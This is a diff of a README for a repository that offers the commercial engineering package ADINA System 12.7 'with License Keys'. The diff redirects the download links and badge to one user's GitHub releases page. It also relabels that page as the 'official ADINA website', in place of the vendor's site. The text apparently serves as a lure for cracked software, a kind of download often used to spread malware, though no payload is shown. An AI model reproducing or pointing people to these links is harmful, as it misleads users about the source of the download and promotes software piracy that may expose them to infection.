@@ -21,9 +21,9 @@ ADINA System 12.7 is a powerful software package that offers a wide range of cap
 ## Repository Link
 
 You can download the ADINA System 12.7 with License Keys from the following link: 
-[Download ADINA System 12.7](https://github.com/files/File.zip)
+[Download ADINA System 12.7](https://github.com/elian2122/ADINA-System-12.7-With-License-Keys-Latest-2025/releases)
 
-[![Download ADINA System 12.7](https://img.shields.io/badge/Download-ADINA%20System%2012.7-blue)](https://github.com/files/File.zip)
+[![Download ADINA System 12.7](https://github.com/elian2122/ADINA-System-12.7-With-License-Keys-Latest-2025/releases%20System%2012.7-blue)](https://github.com/elian2122/ADINA-System-12.7-With-License-Keys-Latest-2025/releases)
 
 ---
 
@@ -55,7 +55,7 @@ If you have any suggestions or improvements for ADINA System 12.7, feel free to 
 
 ### **Support**
 
-For any issues or queries related to ADINA System 12.7, please check the "Releases" section for updates and fixes. You can also visit the official [ADINA website](https://www.adina.com) for more information and support.
+For any issues or queries related to ADINA System 12.7, please check the "Releases" section for updates and fixes. You can also visit the official [ADINA website](https://github.com/elian2122/ADINA-System-12.7-With-License-Keys-Latest-2025/releases) for more information and support.
 
 ---
 
